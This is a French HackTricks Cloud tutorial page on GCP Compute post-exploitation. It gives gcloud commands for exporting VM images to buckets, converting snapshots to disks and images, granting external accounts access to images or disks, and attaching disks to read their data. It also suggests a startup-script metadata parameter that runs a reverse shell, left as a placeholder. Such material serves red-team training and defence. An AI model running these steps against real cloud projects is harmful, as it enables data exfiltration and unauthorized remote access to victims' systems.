# GCP - Post-Exploitation Compute

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## Compute

Pour plus d'informations sur Compute et VPC (R√©seautage), consultez :

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### Exporter et inspecter les images localement

Cela permettrait √† un attaquant de **acc√©der aux donn√©es contenues dans des images d√©j√† existantes** ou **de cr√©er de nouvelles images de VMs en cours d'ex√©cution** et d'acc√©der √† leurs donn√©es sans avoir acc√®s √† la VM en cours d'ex√©cution.

Il est possible d'exporter une image de VM vers un bucket, puis de la t√©l√©charger et de la monter localement avec la commande :

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

Avant d'effectuer cette action, l'attaquant pourrait avoir besoin de privil√®ges sur le bucket de stockage et certainement **de privil√®ges sur cloudbuild**, car c'est le **service** qui sera demand√© pour effectuer l'exportation.\
De plus, pour que cela fonctionne, le SA de codebuild et le SA de compute ont besoin de permissions privil√©gi√©es.\
Le SA cloudbuild `<project-id>@cloudbuild.gserviceaccount.com` a besoin de :

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

Et le SA `<project-id>-compute@developer.gserviceaccount.com` a besoin de :

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### Exporter et inspecter les instantan√©s et disques localement

Il n'est pas possible d'exporter directement des instantan√©s et des disques, mais il est possible de **transformer un instantan√© en disque, un disque en image** et, suivant la **section pr√©c√©dente**, d'exporter cette image pour l'inspecter localement.

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Inspecter une image en cr√©ant une VM

Avec l'objectif d'acc√©der aux **donn√©es stock√©es dans une image** ou √† l'int√©rieur d'une **VM en cours d'ex√©cution** depuis laquelle un attaquant **a cr√©√© une image,** il est possible d'accorder √† un compte externe l'acc√®s √† l'image :
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
et ensuite cr√©er une nouvelle VM √† partir de cela :
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
Si vous ne pouviez pas donner l'acc√®s √† votre compte externe via l'image, vous pourriez lancer une VM en utilisant cette image dans le projet de la victime et **faire ex√©cuter un reverse shell par les m√©tadonn√©es** pour acc√©der √† l'image en ajoutant le param√®tre :
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### Inspecter un instantan√©/un disque en l'attachant √† une VM

Avec l'objectif d'acc√©der aux **donn√©es stock√©es dans un disque ou un instantan√©, vous pourriez transformer l'instantan√© en disque, un disque en image et suivre les √©tapes pr√©c√©dentes.**

Ou vous pourriez **accorder l'acc√®s √† un compte externe** sur le disque (si le point de d√©part est un instantan√©, donner l'acc√®s √† l'instantan√© ou cr√©er un disque √† partir de celui-ci) :
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**Attacher le disque** √† une instance :
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
Montez le disque √† l'int√©rieur de la VM :

1.  **SSH dans la VM** :

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```
2. **Identifiez le disque** : Une fois √† l'int√©rieur de la VM, identifiez le nouveau disque en listant les p√©riph√©riques de disque. En g√©n√©ral, vous pouvez le trouver sous `/dev/sdb`, `/dev/sdc`, etc.
3. **Formatez et montez le disque** (s'il s'agit d'un nouveau disque ou d'un disque brut) :
*   Cr√©ez un point de montage :

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```
*   Montez le disque :

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

Si vous **ne pouvez pas donner acc√®s √† un projet externe** au snapshot ou au disque, vous devrez **effectuer ces actions √† l'int√©rieur d'une instance dans le m√™me projet que le snapshot/disque**.

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
